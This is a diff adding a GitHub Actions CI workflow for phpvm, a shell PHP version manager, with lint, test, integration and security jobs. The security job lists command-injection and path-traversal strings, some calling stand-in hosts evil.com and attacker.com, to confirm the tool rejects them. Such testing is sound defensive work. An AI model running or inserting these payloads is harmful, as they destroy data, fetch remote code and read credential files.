@@ -1,0 +1,525 @@
+name: CI Pipeline
+
+on:
+  push:
+    branches: [main, development, 'fix/**', 'feature/**']
+  pull_request:
+    branches: [main, development]
+  workflow_dispatch:
+  schedule:
+    # Weekly comprehensive tests including security scans
+    - cron: '0 2 * * 1'
+
+jobs:
+  # =============================================================================
+  # QUICK CHECKS - Fast-fail static analysis
+  # =============================================================================
+  quick-checks:
+    name: 'Quick Checks (Syntax, Lint, Format)'
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Shell Syntax Check
+        run: |
+          echo "=== Checking Shell Syntax ==="
+          bash -n phpvm.sh
+          if [ -f install.sh ]; then bash -n install.sh; fi
+          echo "✓ Syntax check passed"
+
+      - name: Install Tools
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y shellcheck
+          wget -O shfmt https://github.com/mvdan/sh/releases/download/v3.12.0/shfmt_v3.12.0_linux_amd64
+          chmod +x shfmt
+          sudo mv shfmt /usr/local/bin/
+
+      - name: ShellCheck Analysis
+        run: |
+          echo "=== Running ShellCheck ==="
+          shellcheck -f gcc phpvm.sh install.sh || exit 1
+          echo "✓ ShellCheck passed"
+
+      - name: Code Formatting Check
+        run: |
+          echo "=== Checking Code Formatting ==="
+          shfmt -d -i 4 -sr phpvm.sh install.sh || {
+            echo "✗ Code formatting issues detected!"
+            echo "Run 'make format' locally to fix."
+            exit 1
+          }
+          echo "✓ Formatting check passed"
+
+      - name: Code Quality Checks
+        run: |
+          echo "=== Checking Code Quality ==="
+
+          # Check for trailing whitespace
+          if grep -n '[[:space:]]$' phpvm.sh install.sh 2>/dev/null; then
+            echo "✗ Trailing whitespace found"
+            exit 1
+          fi
+
+          # Check for tabs (should use spaces)
+          if grep -P '\t' phpvm.sh install.sh 2>/dev/null; then
+            echo "✗ Tabs found - please use spaces"
+            exit 1
+          fi
+
+          echo "✓ Code quality checks passed"
+
+  # =============================================================================
+  # SECURITY TESTING
+  # =============================================================================
+  security:
+    name: 'Security Testing'
+    runs-on: ubuntu-latest
+    needs: quick-checks
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Security-focused ShellCheck
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y shellcheck
+
+          echo "=== Security-focused Shell Analysis ==="
+          shellcheck -f gcc -S error phpvm.sh || true
+
+          # Check for unsafe patterns
+          echo "Checking for potential security issues..."
+
+          if grep -n "eval" phpvm.sh; then
+            echo "⚠ Found eval usage - review for security"
+          fi
+
+          if grep -n "rm -rf \$" phpvm.sh; then
+            echo "⚠ Found variable-based rm -rf - review for safety"
+          fi
+
+          if grep -n "sudo.*\$" phpvm.sh | grep -v "run_with_sudo"; then
+            echo "⚠ Found direct sudo with variables - review for safety"
+          fi
+
+      - name: Input Validation Security Test
+        run: |
+          chmod +x ./phpvm.sh
+
+          echo "=== Testing Input Validation Security ==="
+
+          malicious_inputs=(
+            "8.1; rm -rf /"
+            "8.1 && curl http://evil.com"
+            "8.1 | nc attacker.com 1234"
+            "\$(whoami)"
+            "\`id\`"
+            "8.1 > /etc/passwd"
+            "8.1; cat /etc/shadow"
+            "../../../etc/passwd"
+            "8.1 || wget http://evil.com/script.sh -O - | sh"
+          )
+
+          for input in "${malicious_inputs[@]}"; do
+            echo "Testing malicious input: $input"
+            if ./phpvm.sh install "$input" 2>/dev/null; then
+              echo "✗ SECURITY ISSUE: Accepted malicious input: $input"
+              exit 1
+            else
+              echo "✓ Correctly rejected: $input"
+            fi
+          done
+
+      - name: Path Traversal Security Test
+        run: |
+          echo "=== Testing Path Traversal Protection ==="
+
+          mkdir -p security_test
+          path_traversal_inputs=(
+            "../../../etc/passwd"
+            "../../root/.ssh/id_rsa"
+            "/etc/shadow"
+            "..\\..\\windows\\system32\\config\\sam"
+            "....//....//etc//passwd"
+          )
+
+          for input in "${path_traversal_inputs[@]}"; do
+            echo "$input" > security_test/.phpvmrc
+            cd security_test
+            if ../phpvm.sh auto 2>/dev/null; then
+              echo "✗ SECURITY ISSUE: Accepted path traversal: $input"
+              exit 1
+            else
+              echo "✓ Correctly rejected path traversal: $input"
+            fi
+            cd ..
+          done
+
+      - name: Additional Security Tests
+        run: |
+          chmod +x ./phpvm.sh
+
+          echo "=== Buffer Overflow & Input Length Tests ==="
+          very_long_input=$(printf 'A%.0s' {1..1000})
+          if ./phpvm.sh install "$very_long_input" 2>/dev/null; then
+            echo "✗ SECURITY ISSUE: Accepted extremely long input"
+            exit 1
+          else
+            echo "✓ Correctly rejected extremely long input"
+          fi
+
+          echo "=== File Permission Security ==="
+          mkdir -p perm_test
+          echo "8.1" > perm_test/.phpvmrc
+          chmod 777 perm_test/.phpvmrc
+          cd perm_test
+          ../phpvm.sh auto || echo "✓ Handled world-writable .phpvmrc"
+          cd ..
+
+          echo "=== Checking for Hardcoded Secrets ==="
+          if grep -iE "(password|secret|api.*key|auth.*token)" phpvm.sh | grep -v "^#"; then
+            echo "⚠ Found potential secret patterns - review"
+          fi
+
+          echo "✓ Security tests completed"
+
+  # =============================================================================
+  # BATS TEST SUITE
+  # =============================================================================
+  bats-tests:
+    name: 'BATS Tests (${{ matrix.os }})'
+    runs-on: ${{ matrix.os }}
+    needs: quick-checks
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest]
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Install BATS
+        run: |
+          if [ "${{ runner.os }}" = "macOS" ]; then
+            brew install bats-core
+          else
+            sudo apt-get update
+            sudo apt-get install -y bats
+          fi
+
+      - name: Run BATS Test Suite
+        run: |
+          echo "=== Running BATS Test Suite ==="
+          bats tests/ -t
+
+      - name: Upload Test Results
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: bats-results-${{ matrix.os }}
+          path: test-results/
+          retention-days: 30
+
+  # =============================================================================
+  # CORE FUNCTIONALITY TESTS
+  # =============================================================================
+  core-tests:
+    name: 'Core Functionality (${{ matrix.os }})'
+    runs-on: ${{ matrix.os }}
+    needs: quick-checks
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest]
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Homebrew (Linux)
+        if: runner.os == 'Linux'
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential curl file git
+          NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+          echo 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"' >> ~/.bashrc
+          eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
+          brew --version
+
+      - name: Make Script Executable
+        run: chmod +x ./phpvm.sh
+
+      - name: Test Version Commands
+        run: |
+          echo "=== Testing Version Commands ==="
+          ./phpvm.sh version
+          ./phpvm.sh --version
+          ./phpvm.sh -v
+          echo "✓ All version commands work"
+
+      - name: Test Basic Commands
+        run: |
+          echo "=== Testing Basic Commands ==="
+          ./phpvm.sh help
+          ./phpvm.sh list || echo "List executed"
+          ./phpvm.sh info
+          echo "✓ Basic commands work"
+
+      - name: Test Error Handling
+        run: |
+          echo "=== Testing Error Handling ==="
+
+          # Invalid command
+          if ./phpvm.sh invalid_command 2>/dev/null; then
+            echo "✗ Should have failed on invalid command"
+            exit 1
+          else
+            echo "✓ Correctly handles invalid commands"
+          fi
+
+          # Missing version parameter
+          if ./phpvm.sh use 2>/dev/null; then
+            echo "✗ Should have failed on missing version"
+            exit 1
+          else
+            echo "✓ Correctly handles missing version parameter"
+          fi
+
+      - name: Test .phpvmrc Auto-Switch
+        run: |
+          echo "=== Testing .phpvmrc Auto-Switch ==="
+          mkdir -p test_project
+          echo "8.3" > test_project/.phpvmrc
+
+          cd test_project
+          if [[ "${{ runner.os }}" == "Linux" ]]; then
+            eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)" 2>/dev/null || true
+          fi
+
+          ../phpvm.sh auto || echo "Auto-switch attempted"
+          cd ..
+          echo "✓ Auto-switch test completed"
+
+      - name: Performance Check
+        run: |
+          echo "=== Performance Check ==="
+          time ./phpvm.sh version >/dev/null
+          time ./phpvm.sh help >/dev/null
+          time ./phpvm.sh list >/dev/null
+          echo "✓ Performance check completed"
+
+  # =============================================================================
+  # PHP INSTALLATION & INTEGRATION TESTS
+  # =============================================================================
+  php-integration:
+    name: 'PHP Integration (${{ matrix.os }})'
+    runs-on: ${{ matrix.os }}
+    needs: [bats-tests, core-tests]
+    strategy:
+      fail-fast: false
+      matrix:
+        os: [ubuntu-latest, macos-latest]
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Homebrew (Linux)
+        if: runner.os == 'Linux'
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y build-essential curl file git
+          NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+          echo 'eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"' >> ~/.bashrc
+          eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
+
+      - name: Test Installation Script
+        run: |
+          echo "=== Testing install.sh ==="
+          bash -n install.sh
+
+          # Verify install script components
+          grep -q "uname" install.sh && echo "✓ OS detection present"
+          grep -qE "curl|wget" install.sh && echo "✓ Download mechanism present"
+          grep -q "chmod" install.sh && echo "✓ Permission setting present"
+
+      - name: Test PHP Installation Flow
+        run: |
+          chmod +x phpvm.sh
+          if [[ "${{ runner.os }}" == "Linux" ]]; then
+            eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
+          fi
+
+          echo "=== Testing PHP Installation ==="
+          ./phpvm.sh install 8.3 || echo "PHP 8.3 installation attempted"
+          ./phpvm.sh use 8.3 || echo "Switch to 8.3 attempted"
+          ./phpvm.sh list
+          ./phpvm.sh system || echo "System switch attempted"
+
+      - name: Test Project Workflow
+        run: |
+          if [[ "${{ runner.os }}" == "Linux" ]]; then
+            eval "$(/home/linuxbrew/.linuxbrew/bin/brew shellenv)"
+          fi
+
+          echo "=== Testing Project Workflow ==="
+          mkdir -p test_project
+          echo "8.3" > test_project/.phpvmrc
+          cd test_project
+          ../phpvm.sh auto || echo "Auto-switch attempted"
+          cd ..
+
+      - name: Test Error Recovery
+        run: |
+          echo "=== Testing Error Recovery ==="
+
+          # Corrupted state
+          mkdir -p ~/.phpvm
+          echo "corrupted_data" > ~/.phpvm/active_version
+          ./phpvm.sh list || echo "✓ Handled corrupted state"
+
+          # Missing directories
+          rm -rf ~/.phpvm/versions 2>/dev/null || true
+          ./phpvm.sh list || echo "✓ Handled missing directories"
+
+          # Invalid .phpvmrc
+          mkdir -p error_test
+          printf '\x00\x01\x02' > error_test/.phpvmrc
+          cd error_test
+          ../phpvm.sh auto 2>/dev/null || echo "✓ Handled binary .phpvmrc"
+          cd ..
+
+  # =============================================================================
+  # EXTENDED TESTS - Multi-Distribution (Scheduled only)
+  # =============================================================================
+  multi-distro:
+    name: 'Multi-Distribution (${{ matrix.scenario }})'
+    runs-on: ubuntu-latest
+    needs: quick-checks
+    if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          - distro: ubuntu:22.04
+            scenario: 'Ubuntu 22.04 LTS'
+          - distro: ubuntu:24.04
+            scenario: 'Ubuntu 24.04 LTS'
+          - distro: debian:12
+            scenario: 'Debian 12'
+          - distro: fedora:39
+            scenario: 'Fedora 39'
+          - distro: alpine:3.19
+            scenario: 'Alpine 3.19'
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Run Tests in Container
+        run: |
+          if [[ "${{ matrix.distro }}" == alpine* ]]; then
+            SHELL_CMD="sh"
+          else
+            SHELL_CMD="bash"
+          fi
+
+          docker run --rm -v $PWD:/workspace -w /workspace ${{ matrix.distro }} $SHELL_CMD -c "
+            echo '=== Testing on ${{ matrix.scenario }} ==='
+
+            # Install basic tools
+            if command -v apt-get >/dev/null 2>&1; then
+              apt-get update && apt-get install -y bash curl
+            elif command -v dnf >/dev/null 2>&1; then
+              dnf install -y bash curl
+            elif command -v apk >/dev/null 2>&1; then
+              apk add --no-cache bash curl
+            fi
+
+            # Test syntax
+            bash -n phpvm.sh || exit 1
+
+            # Test basic commands
+            chmod +x phpvm.sh
+            ./phpvm.sh version || exit 1
+            ./phpvm.sh help >/dev/null || exit 1
+
+            echo '✓ All tests passed for ${{ matrix.scenario }}'
+          "
+
+  # =============================================================================
+  # PERFORMANCE TESTING (Scheduled only)
+  # =============================================================================
+  performance:
+    name: 'Performance & Load Testing'
+    runs-on: ubuntu-latest
+    needs: quick-checks
+    if: github.event_name == 'schedule' || github.event_name == 'workflow_dispatch'
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Performance Benchmarks
+        run: |
+          chmod +x ./phpvm.sh
+
+          echo "=== Performance Testing ==="
+
+          # Startup time
+          echo "Measuring startup time (10 iterations):"
+          for i in {1..10}; do
+            time ./phpvm.sh version >/dev/null
+          done
+
+          # Concurrent operations
+          echo "Testing 20 concurrent operations:"
+          for i in {1..20}; do
+            ./phpvm.sh version >/dev/null &
+          done
+          wait
+
+          echo "✓ Performance tests completed"
+
+  # =============================================================================
+  # QUALITY GATE - Final validation
+  # =============================================================================
+  quality-gate:
+    name: 'Quality Gate ✅'
+    runs-on: ubuntu-latest
+    needs: [quick-checks, security, bats-tests, core-tests, php-integration]
+    if: always()
+    steps:
+      - name: Check All Required Jobs
+        run: |
+          echo "=== Quality Gate Validation ==="
+
+          if [ "${{ needs.quick-checks.result }}" != "success" ]; then
+            echo "✗ Quick checks failed"
+            exit 1
+          fi
+
+          if [ "${{ needs.security.result }}" != "success" ]; then
+            echo "✗ Security tests failed"
+            exit 1
+          fi
+
+          if [ "${{ needs.bats-tests.result }}" != "success" ]; then
+            echo "✗ BATS tests failed"
+            exit 1
+          fi
+
+          if [ "${{ needs.core-tests.result }}" != "success" ]; then
+            echo "✗ Core tests failed"
+            exit 1
+          fi
+
+          if [ "${{ needs.php-integration.result }}" != "success" ]; then
+            echo "✗ PHP integration tests failed"
+            exit 1
+          fi
+
+          echo "✅ All quality checks passed!"
+          echo "✅ CI pipeline successful!"
